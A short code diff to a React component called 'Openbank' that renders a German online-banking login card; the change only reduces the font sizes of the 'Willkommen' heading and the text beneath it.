@@ -104,8 +104,8 @@ const Openbank = () => {
           <div className="max-w-[1200px] mx-auto px-6 lg:px-10 py-10 lg:py-16 grid grid-cols-1 lg:grid-cols-2 gap-10 items-center">
             {/* Login card */}
             <div className="lg:pl-10 lg:order-1 order-2 w-full max-w-[480px] mx-auto lg:mx-0">
-              <h1 className="text-[40px] lg:text-[48px] font-bold leading-tight mb-3">Willkommen</h1>
-              <p className="text-[14px] mb-6">
+              <h1 className="text-[32px] lg:text-[38px] font-bold leading-tight mb-3">Willkommen</h1>
+              <p className="text-[12px] mb-6">
                 Weitere Informationen zum Online Banking finden sie <a href="#" className="ob-link-hero font-bold">hier</a>.
               </p>
 
